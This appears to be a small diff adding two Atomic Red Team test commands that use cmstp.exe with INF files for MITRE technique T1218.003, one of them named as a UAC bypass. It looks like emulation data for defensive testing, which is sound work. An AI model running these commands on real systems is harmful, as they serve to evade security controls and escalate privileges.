@@ -1,0 +1,2 @@
+cmstp.exe  /s "C:\AtomicRedTeam\atomics\T1218.003\src\T1218.003_uacbypass.inf" /au
+cmstp.exe  /s "C:\AtomicRedTeam\atomics\T1218.003\src\T1218.003.inf"
